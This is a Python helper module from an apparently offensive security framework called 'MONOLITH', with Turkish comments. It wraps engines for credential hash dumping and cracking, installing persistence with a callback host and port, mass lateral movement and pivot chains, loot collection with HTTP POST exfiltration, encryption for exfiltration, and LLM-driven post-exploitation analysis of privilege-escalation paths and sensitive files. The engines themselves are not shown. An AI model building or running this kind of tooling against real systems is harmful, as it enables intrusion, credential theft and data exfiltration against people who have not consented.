import base64
import hashlib
import warnings
from dataclasses import asdict
from typing import Dict, List

from cybermodules.error_handling import ErrorHandler
# Ortak yardımcı fonksiyonlar
warnings.filterwarnings(
    "ignore",
    message="You have both PyFPDF & fpdf2 installed",
    category=UserWarning,
)
from fpdf import FPDF

class PDFReport(FPDF):
	def header(self):
		self.set_font('Arial', 'B', 15)
		self.set_text_color(0, 100, 0)
		self.cell(0, 10, 'MONOLITH SECURITY REPORT', 0, 1, 'C')
		self.ln(5)

	def chapter_title(self, title, rgb):
		self.set_font('Arial', 'B', 12)
		self.set_fill_color(*rgb)
		self.cell(0, 8, title, 0, 1, 'L', True)
		self.ln(4)

def tr_fix(txt):
	if isinstance(txt, str):
		return txt.encode('latin-1', 'replace').decode('latin-1')
	return str(txt)

# Dosyanın en altına ekle

def log_to_intel(scan_id, msg_type, data):
    """
    Intel tablosuna log yaz - global helper
    """
    from cyberapp.models.db import db_conn
    from datetime import datetime
    
    try:
        with db_conn() as conn:
            conn.execute(
                "INSERT INTO intel (scan_id, type, data, timestamp) VALUES (?, ?, ?, ?)",
                (scan_id, msg_type, data, datetime.now())
            )
            conn.commit()
        return True
    except Exception as e:
        print(f"[HELPERS] Intel log error: {e}")
        return False


def run_automated_hashdump(scan_id, target, username, password, domain=""):
    """
    Hashdump + crack workflow - tek fonksiyon ile çağrı
    """
    from cybermodules.hashdump import HashDumpEngine
    
    engine = HashDumpEngine(scan_id, {
        "target": target,
        "username": username,
        "password": password,
        "domain": domain
    })
    
    return engine.execute_session_hook()



def install_persistence(scan_id, target, lhost, lport, os_type="linux", methods=None):
    """
    Quick persistence installation helper
    """
    from cybermodules.persistence import PersistenceEngine, OSType
    
    session_info = {
        "target": target,
        "lhost": lhost,
        "lport": lport,
        "os": os_type
    }
    
    engine = PersistenceEngine(scan_id, session_info)
    
    # Set OS type
    if "windows" in os_type.lower():
        engine.os_type = OSType.WINDOWS
    elif "linux" in os_type.lower() or "unix" in os_type.lower():
        engine.os_type = OSType.LINUX
    elif "macos" in os_type.lower():
        engine.os_type = OSType.MACOS
    
    # Install persistence
    results = engine.install_all(methods)
    
    return {
        "commands": engine.get_commands(),
        "report": engine.generate_report()
    }


def remove_persistence(scan_id, target):
    """
    Remove installed persistence (OPSEC cleanup)
    """
    from cybermodules.persistence import PersistenceEngine
    
    session_info = {"target": target}
    engine = PersistenceEngine(scan_id, session_info)
    
    return engine.cleanup()



def execute_lateral_movement(scan_id, target, username, password, domain="", nt_hash=""):
    """
    Quick lateral movement execution helper
    """
    from cybermodules.lateral_movement import LateralMovementEngine, LateralMethod
    
    session_info = {
        "target": target,
        "username": username,
        "password": password,
        "domain": domain,
        "nt_hash": nt_hash
    }
    
    engine = LateralMovementEngine(scan_id, session_info)
    
    # Get targets from AD
    targets = engine.get_targets_from_ad_enum()
    
    if not targets:
        # Add target as single
        targets = [{"hostname": target, "ip": target, "type": "manual"}]
    
    # Prepare credentials
    credentials = engine.prepare_credentials()
    
    # Execute
    results = engine.execute_mass_movement(targets, credentials)
    
    return {
        "results": results,
        "success_count": engine.success_count,
        "report": engine.generate_report()
    }


def chain_pivots(scan_id, pivot_sequence):
    """
    Execute pivot chain
    pivot_sequence: [{'target': 'host1', 'creds': {'username': 'u1', 'password': 'p1'}}, ...]
    """
    from cybermodules.lateral_movement import LateralMovementEngine
    
    session_info = {
        "target": pivot_sequence[0]['target'] if pivot_sequence else "",
        "username": pivot_sequence[0]['creds'].get('username', '') if pivot_sequence else "",
        "password": pivot_sequence[0]['creds'].get('password', '') if pivot_sequence else ""
    }
    
    engine = LateralMovementEngine(scan_id, session_info)
    
    return engine.execute_pivot_chain(pivot_sequence)

# Dosyanın en altına ekle

def execute_loot_exfil(scan_id: int, config: Dict = None):
    """
    Quick loot exfil execution helper
    """
    from cybermodules.loot_exfil import LootExfilEngine, ExfilMethod
    
    engine = LootExfilEngine(scan_id, config)
    
    return engine.execute_full_pipeline(
        collect_creds=True,
        collect_hashes=True,
        exfil_method=ExfilMethod.HTTP_POST,
        publish_blockchain=True
    )


def collect_loot_items(scan_id: int) -> Dict:
    """
    Just collect loot without exfiltration
    """
    from cybermodules.loot_exfil import LootCollector
    
    collector = LootCollector(scan_id)
    items = collector.collect_all()
    
    return {
        'items': len(items),
        'summary': collector.get_loot_summary()
    }


def encrypt_data_for_exfil(data: bytes, password: str = None) -> Dict:
    """
    Encrypt data for exfiltration
    """
    from cybermodules.loot_exfil import EncryptionEngine
    
    engine = EncryptionEngine(master_password=password)
    
    encrypted, nonce = engine.encrypt(data)
    
    return {
        'encrypted_data': base64.b64encode(encrypted).decode(),
        'nonce': base64.b64encode(nonce).decode(),
        'key_hash': hashlib.sha256(engine.master_key).hexdigest()
    }


def publish_to_blockchain(scan_id: int, data: bytes, metadata: Dict = None) -> Dict:
    """
    Publish data hash to blockchain for audit
    """
    from cybermodules.loot_exfil import BlockchainPublisher
    
    publisher = BlockchainPublisher(scan_id)
    
    content_hash = publisher.calculate_content_hash(data)
    
    ipfs_result = publisher.publish_to_ipfs(data)
    eth_result = publisher.publish_hash_to_ethereum(content_hash, metadata)
    
    return {
        'content_hash': content_hash,
        'ipfs': ipfs_result,
        'ethereum': eth_result
    }

# Dosyanın en altına ekle

def run_ai_post_exploit_analysis(scan_id: int, llm_config: Dict = None) -> Dict:
    """
    Run AI-powered post-exploitation analysis
    """
    from cybermodules.ai_post_exploit import AIPostExploitEngine
    
    engine = AIPostExploitEngine(scan_id, llm_config)
    report = engine.run_full_analysis()
    
    return {
        'report': engine.generate_report(),
        'risk_score': report.risk_score,
        'priv_esc_vectors': len(report.privilege_escalation),
        'sensitive_files': len(report.sensitive_files)
    }


def add_session_output_to_ai(scan_id: int, command: str, output: str, host: str = "target"):
    """
    Add command output to AI analyzer
    """
    from cybermodules.ai_post_exploit import AIPostExploitEngine
    
    engine = AIPostExploitEngine(scan_id)
    engine.add_session_output(command, output, host)
    
    return engine


def analyze_privilege_escalation(scan_id: int) -> List[Dict]:
    """
    Analyze privilege escalation opportunities
    """
    from cybermodules.ai_post_exploit import AIPostExploitEngine
    
    engine = AIPostExploitEngine(scan_id)
    engine.run_system_enumeration()
    vectors = engine.analyze_privilege_escalation()
    
    return [asdict(v) for v in vectors]


def get_sensitive_file_recommendations(scan_id: int) -> List[Dict]:
    """
    Get sensitive file recommendations
    """
    from cybermodules.ai_post_exploit import AIPostExploitEngine
    
    engine = AIPostExploitEngine(scan_id)
    engine.run_system_enumeration()
    files = engine.analyze_sensitive_files()
    
    return [asdict(f) for f in files]


def query_ai_for_insights(scan_id: int, custom_prompt: str) -> str:
    """
    Query AI for custom insights
    """
    from cybermodules.ai_post_exploit import AIPostExploitEngine
    
    engine = AIPostExploitEngine(scan_id)
    
    if not engine.system_info:
        engine.run_system_enumeration()
    if not engine.priv_esc_vectors:
        engine.analyze_privilege_escalation()
    if not engine.sensitive_files:
        engine.analyze_sensitive_files()
    
    return engine.query_llm_for_insights(custom_prompt)
